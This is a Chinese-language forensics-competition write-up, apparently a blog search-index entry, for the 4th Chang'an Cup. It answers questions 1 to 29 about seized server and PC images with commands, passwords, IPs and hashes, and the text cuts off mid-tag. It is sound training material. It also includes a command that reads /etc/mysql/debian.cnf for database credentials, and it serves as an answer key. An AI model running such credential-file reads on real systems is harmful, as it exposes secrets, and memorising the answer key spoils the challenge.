<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>第四届长安杯取证复现</title>
    <link href="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/"/>
    <url>/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4">下载</a>好附件，VeraCrypt密码：2022.4th.changancup!</p><p><a href="https://www.forensics-wiki.com/base/veracrypt/">使用VeraCrypt挂在VC容器</a></p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142228909.png" class title="image-20240408142228909"><p>我选择是在Z盘，加载成功后多出一个Z盘，打开得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408142312925.png" class title="image-20240408142312925"><h2 id="1-检材1的SHA256值为？"><a href="#1-检材1的SHA256值为？" class="headerlink" title="1.检材1的SHA256值为？"></a>1.检材1的SHA256值为？</h2><p>用X-ways计算sha265,直接拖入—&gt;工具—&gt;计算哈希，选择sha256即可，注意这里的sha256问的是原始硬盘的哈希值，而非.e01文件的哈希值</p><p>错误答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170254927.png" class title="image-20240408170254927"><p>正确答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408170425738.png" class title="image-20240408170425738"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9E48BB2CAE5C1D93BAF572E3646D2ECD26080B70413DC7DC4131F88289F49E34<br></code></pre></td></tr></table></figure><h2 id="2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"><a href="#2-分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2" class="headerlink" title="2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2"></a>2.分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2</h2><p>仿真后选择第二个选项进入，root账户为弱密码123456，执行last命令，得到ip（这里如果仿真失败，<a href="https://www.cnblogs.com/dfir/p/16353508.html#6%E7%A3%81%E7%9B%98%E8%A2%AB%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98">参考</a>），如果还是不行，就更换<a href="https://www.52pojie.cn/thread-1698481-1-1.html">FTK</a>版本。这里我测试3.3的比较好用</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408234736568.png" class title="image-20240408234736568"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.100<br></code></pre></td></tr></table></figure><h2 id="3-检材1中，操作系统发行版本号为"><a href="#3-检材1中，操作系统发行版本号为" class="headerlink" title="3.检材1中，操作系统发行版本号为"></a>3.检材1中，操作系统发行版本号为</h2><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/*-release<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235019922.png" class title="image-20240408235019922"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">CentOS 7.5.1804<br></code></pre></td></tr></table></figure><h2 id="4-检材1系统中，网卡绑定的静态IP地址为"><a href="#4-检材1系统中，网卡绑定的静态IP地址为" class="headerlink" title="4.检材1系统中，网卡绑定的静态IP地址为"></a>4.检材1系统中，网卡绑定的静态IP地址为</h2><p>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235220717.png" class title="image-20240408235220717"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.133<br></code></pre></td></tr></table></figure><h2 id="5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”"><a href="#5-检材1中，网站jar包所存放的目录是-答案为绝对路径，如“-home-honglian-”" class="headerlink" title="5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“&#x2F;home&#x2F;honglian&#x2F;”)"></a>5.检材1中，网站jar包所存放的目录是(答案为绝对路径，如“&#x2F;home&#x2F;honglian&#x2F;”)</h2><p>这里可以执行history命令查看历史命令，在&#x2F;web&#x2F;app目录下有多次操作，可以在该目录下发现大量jar包，或者执行find命令查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name *.jar<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240408235338821.png" class title="image-20240408235338821"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/web/app/<br></code></pre></td></tr></table></figure><h2 id="6-检材1中，监听7000端口的进程对应文件名为"><a href="#6-检材1中，监听7000端口的进程对应文件名为" class="headerlink" title="6.检材1中，监听7000端口的进程对应文件名为"></a>6.检材1中，监听7000端口的进程对应文件名为</h2><p>解压缩，在cloud.jar的BOOT-INF\classes\application.properties发现7000端口</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409110206022.png" class title="image-20240409110206022"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">application.properties<br></code></pre></td></tr></table></figure><h2 id="7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"><a href="#7-检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）" class="headerlink" title="7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）"></a>7.检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113321599.png" class title="image-20240409113321599"><p>可以看到在&#x2F;web&#x2F;app&#x2F;admin下多次执行npm run dev命令，故在该目录下复现操作</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409113449452.png" class title="image-20240409113449452"><p>登录0.0.0.0:9090，发现是网站后台</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202347637.png" class title="image-20240410202347637"><p>故网址端口为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">9090<br></code></pre></td></tr></table></figure><h2 id="8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”"><a href="#8-检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https-www-forensix-cn-abc-def”" class="headerlink" title="8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https://www.forensix.cn/abc/def”)"></a>8.检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“<a href="https://www.forensix.cn/abc/def%E2%80%9D">https://www.forensix.cn/abc/def”</a>)</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124341670.png" class title="image-20240409124341670"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410203832688.png" class title="image-20240410203832688"><p>查看日志，发现可疑端口3000，猜测是网址前台，根据历史命令，尝试搭建</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409124806458.png" class title="image-20240409124806458"><p>扫码复制链接得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://pan.forensix.cn/f/c45ca511c7f2469090ad/?dl=1<br></code></pre></td></tr></table></figure><h2 id="9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为"><a href="#9-检材1中，网站管理后台页面调用的用户表-admin-里的密码字段加密方式为" class="headerlink" title="9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?"></a>9.检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409125332761.png" class title="image-20240409125332761"><p>尝试登录发现url为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://172.16.80.133:6010/admin/system/employee/googleAuth/sign/in<br></code></pre></td></tr></table></figure><p>在admin-api.jar里查找</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240409130211737.png" class title="image-20240409130211737"><p>加密方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">md5<br></code></pre></td></tr></table></figure><h2 id="10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"><a href="#10-分析检材1，网站管理后台登录密码加密算法中所使用的盐值是" class="headerlink" title="10. 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是"></a><strong>10.</strong> 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240410202041387.png" class title="image-20240410202041387"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs<br></code></pre></td></tr></table></figure><h2 id="11-检材2中，windows账户Web-King的登录密码是"><a href="#11-检材2中，windows账户Web-King的登录密码是" class="headerlink" title="11.检材2中，windows账户Web King的登录密码是"></a>11.检材2中，windows账户Web King的登录密码是</h2><p>火眼得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">135790<br></code></pre></td></tr></table></figure><h2 id="12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"><a href="#12-检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3" class="headerlink" title="12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3"></a>12.检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3</h2><p>仿真后xshell要更新，无法使用，打开其安装目录，在Users&#x2F;Web King&#x2F;Documents&#x2F;NetSarang Computer&#x2F;7&#x2F;Xshell&#x2F;Sessions得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412115713352.png" class title="image-20240412115713352"><p>答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.128<br></code></pre></td></tr></table></figure><h2 id="13-检材2中，powershell中输入的最后一条命令是"><a href="#13-检材2中，powershell中输入的最后一条命令是" class="headerlink" title="13.检材2中，powershell中输入的最后一条命令是"></a>13.检材2中，powershell中输入的最后一条命令是</h2><p>打开powershell，按↑得到，或者使用命令Get-History | Format-List -Property *</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412120041769.png" class title="image-20240412120041769"><p>答案：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig<br></code></pre></td></tr></table></figure><h2 id="14-检材2中，下载的涉案网站源代码文件名为"><a href="#14-检材2中，下载的涉案网站源代码文件名为" class="headerlink" title="14.检材2中，下载的涉案网站源代码文件名为"></a>14.检材2中，下载的涉案网站源代码文件名为</h2><p>在检材1的网站里，可以发现网站名字，打开下载目录</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121034133.png" class title="image-20240412121034133"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121156972.png" class title="image-20240412121156972"><p>所以答案为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZTuoExchange_framework-master.zip<br></code></pre></td></tr></table></figure><h2 id="15-检材2中，网站管理后台root账号的密码为"><a href="#15-检材2中，网站管理后台root账号的密码为" class="headerlink" title="15.检材2中，网站管理后台root账号的密码为"></a>15.检材2中，网站管理后台root账号的密码为</h2><p>打开浏览器查看浏览器储存的密码</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121402793.png" class title="image-20240412121402793"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">root<br></code></pre></td></tr></table></figure><h2 id="16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）"><a href="#16-检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows-10-1）" class="headerlink" title="16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）"></a>16.检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121540956.png" class title="image-20240412121540956"><p>在搜索栏搜索常见的wsl，这里有2个，运行只有20的可以，或者执行命令wsl –list –verbose</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121717638.png" class title="image-20240412121717638"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ubuntu 20.04<br></code></pre></td></tr></table></figure><h2 id="17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）"><a href="#17-检材2中，运行的数据库服务版本号是（答案格式如下：10-1）" class="headerlink" title="17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）"></a>17.检材2中，运行的数据库服务版本号是（答案格式如下：10.1）</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412121835144.png" class title="image-20240412121835144"><p>进入WSL,执行mysql -V</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">mysql 8.0.30<br></code></pre></td></tr></table></figure><h2 id="18-上述数据库debian-sys-maint用户的初始密码是"><a href="#18-上述数据库debian-sys-maint用户的初始密码是" class="headerlink" title="18.上述数据库debian-sys-maint用户的初始密码是"></a>18.上述数据库debian-sys-maint用户的初始密码是</h2><p>执行 cat &#x2F;etc&#x2F;mysql&#x2F;debian.cnf得到</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412123700724.png" class title="image-20240412123700724"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">ZdQfi7vaXjHZs75M<br></code></pre></td></tr></table></figure><h2 id="19-检材3服务器root账号的密码是"><a href="#19-检材3服务器root账号的密码是" class="headerlink" title="19.检材3服务器root账号的密码是"></a>19.检材3服务器root账号的密码是</h2><p>执行history命令，发现用root账户连接了172.16.80.128</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412124154091.png" class title="image-20240412124154091"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">h123456<br></code></pre></td></tr></table></figure><h2 id="20-检材3中，监听33050端口的程序名（program-name）为"><a href="#20-检材3中，监听33050端口的程序名（program-name）为" class="headerlink" title="20.检材3中，监听33050端口的程序名（program name）为"></a>20.检材3中，监听33050端口的程序名（program name）为</h2><p>仿真后xshel连接，使用history命令，发现在data&#x2F;mysql下启动了docker</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193052083.png" class title="image-20240412193052083"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412192804081.png" class title="image-20240412192804081"><p>查看有关文件，发现端口33050，在&#x2F;data&#x2F;mysql&#x2F;下启动docker,同时这里也有22和23题的答案</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412182338221.png" class title="image-20240412182338221"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">docker-proxy<br></code></pre></td></tr></table></figure><h2 id="21-除MySQL外，该网站还依赖以下哪种数据库"><a href="#21-除MySQL外，该网站还依赖以下哪种数据库" class="headerlink" title="21.除MySQL外，该网站还依赖以下哪种数据库"></a>21.除MySQL外，该网站还依赖以下哪种数据库</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193418866.png" class title="image-20240412193418866"><p>查看历史命令，发现还启动了nohup了redis和mongo</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">redis和mongo<br></code></pre></td></tr></table></figure><h2 id="22-检材3中，MySQL数据库root账号的密码是"><a href="#22-检材3中，MySQL数据库root账号的密码是" class="headerlink" title="22.检材3中，MySQL数据库root账号的密码是"></a>22.检材3中，MySQL数据库root账号的密码是</h2><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412193851285.png" class title="image-20240412193851285"><p>在20题的docker文件中可以发现密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">sshl7701<br></code></pre></td></tr></table></figure><h2 id="23-检材3中，MySQL数据库在容器内部的数据目录为"><a href="#23-检材3中，MySQL数据库在容器内部的数据目录为" class="headerlink" title="23.检材3中，MySQL数据库在容器内部的数据目录为"></a>23.检材3中，MySQL数据库在容器内部的数据目录为</h2><p>在20题的docker文件中可以发现数据库文件在&#x2F;var&#x2F;lib&#x2F;mysql</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412194050132.png" class title="image-20240412194050132"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">/var/lib/mysql<br></code></pre></td></tr></table></figure><h2 id="24-涉案网站调用的MySQL数据库名为"><a href="#24-涉案网站调用的MySQL数据库名为" class="headerlink" title="24.涉案网站调用的MySQL数据库名为"></a>24.涉案网站调用的MySQL数据库名为</h2><p>在检材1的admin-api.jar里发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201755416.png" class title="image-20240412201755416"><p>以及检材3的data&#x2F;mysql&#x2F;db&#x2F;8eda4cb0b452.log可以发现</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202037242.png" class title="image-20240412202037242"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">b1<br></code></pre></td></tr></table></figure><h2 id="25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”"><a href="#25-勒索者在数据库中修改了多少个用户的手机号？-答案填写阿拉伯数字，如“15”" class="headerlink" title="25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)"></a>25.勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)</h2><p>在data&#x2F;mysql&#x2F;db下，查看8eda4cb0b452.log，搜索UOPDATE,发现有3个命令修改手机号</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201328928.png" class title="image-20240412201328928"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201606706.png" class title="image-20240412201606706"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412201356495.png" class title="image-20240412201356495"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">3<br></code></pre></td></tr></table></figure><h2 id="26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”"><a href="#26-勒索者在数据库中删除的用户数量为-答案填写阿拉伯数字，如“15”" class="headerlink" title="26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)"></a>26.勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)</h2><p>还是上面那个文件，搜索DELETE,从973—1000</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412202247958.png" class title="image-20240412202247958"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">28<br></code></pre></td></tr></table></figure><h2 id="27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"><a href="#27-还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4" class="headerlink" title="27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4"></a>27.还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4</h2><p>在检材2的D盘发现了搭建网站的数据库文件b1和其他一些文件</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412203530045.png" class title="image-20240412203530045"><p>这里将检材2里D盘发现的b1数据库恢复到&#x2F;data&#x2F;mysql&#x2F;db,启动数据库，查看数据库</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161057221.png" class title="image-20240413161057221"><p>使用的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start docker<br>docker exec -it 8eda /bin/bash<br>mysql -u root -pshhl7001<br></code></pre></td></tr></table></figure><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413161919911.png" class title="image-20240413161919911"><p>连接数据库，发现有两个ip,100为检材2的ip（技术员ip）,197的就为所求ip</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240412225905572.png" class title="image-20240412225905572"><p>这里也可以看日志，搜索172.16.80，发现admin登录只有100和197的ip。</p><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">172.16.80.197<br></code></pre></td></tr></table></figure><h2 id="28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"><a href="#28-还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为" class="headerlink" title="28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为"></a>28.还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为</h2><p>在member_wallet表中，找到id&#x3D;500的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164220631.png" class title="image-20240413164220631"><p>答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs copy">cee631121c2ec9232f3a2f028ad5c89b<br></code></pre></td></tr></table></figure><h2 id="29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”"><a href="#29-还原全部被删改数据，共有多少名用户的会员等级为’LV3’-答案填写阿拉伯数字，如“15”" class="headerlink" title="29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)"></a>29.还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)</h2><p>在member表里搜索等级为3的用户，共158个</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413164538622.png" class title="image-20240413164538622"><p>在上面数据库文件不包括删除的</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165635903.png" class title="image-20240413165635903"><p>在数据库日志中查到下方内容，按照等级为3用户的数据特征搜索973-1000的用户</p><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165552462.png" class title="image-20240413165552462"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165834230.png" class title="image-20240413165834230"><img src="/2024/04/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%AE%89%E6%9D%AF%E5%8F%96%E8%AF%81wp/image-20240413165853503.png" class title="image-20240413165853503"><img 